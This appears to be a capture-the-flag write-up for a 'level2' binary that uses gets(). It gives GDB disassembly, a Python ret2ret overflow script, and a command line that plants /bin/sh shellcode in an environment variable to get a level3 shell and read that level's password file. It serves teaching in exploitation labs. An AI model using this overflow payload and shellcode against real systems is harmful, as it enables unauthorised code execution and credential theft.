# Level2

First step - testing the program
```
$ ./level2
a
a
```
The program print the input

Start it in GDB
```
(gdb)$ disas main
Dump of assembler code for function main:
   0x0804853f <+0>:		push   ebp
   0x08048540 <+1>:		mov    ebp,esp
   0x08048542 <+3>:		and    esp,0xfffffff0
   0x08048545 <+6>:		call   0x80484d4 <p>
   0x0804854a <+11>:	leave
   0x0804854b <+12>:	ret
End of assembler dump.
```
The main call a function `p`

```
(gdb)$ disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:		push   ebp
   0x080484d5 <+1>:		mov    ebp,esp
   0x080484d7 <+3>:		sub    esp,0x68
   0x080484da <+6>:		mov    eax,ds:0x8049860
   0x080484df <+11>:	mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    eax,0x8048620
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret
End of assembler dump.
```

---

We have an exploit to `get()` with bufferoverflow.

But this time, there is stack protection :
```
0x080484fb <+39>:	and    eax,0xb0000000
0x08048500 <+44>:	cmp    eax,0xb0000000
0x08048505 <+49>:	jne    0x8048527 <p+83>
```
We can't inject shellcode in the buffer or environment variable.


So, we will use Ret2Ret methode for overwrite EIP to another ret instruction, here, in the main. And put shellcode in new environment variable.

```
#!/usr/bin/python

import struct

ENV = struct.pack("I", 0xbfffff37)      # environment variable address

RET = struct.pack("I", 0x0804854b)      # main ret address

print "C" * 80 + RET + ENV              # 80 lenght offset for overwrite EIP

```

Let's go ! 
```
$> ./ret2ret.py > payload

$> cat payload - | env -i EXPLOIT=$(python -c 'print("\x90" * 100 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') $PWD/level2
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCKCCCCCCCCCCCCK7���
$> whoami
level3
$> cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
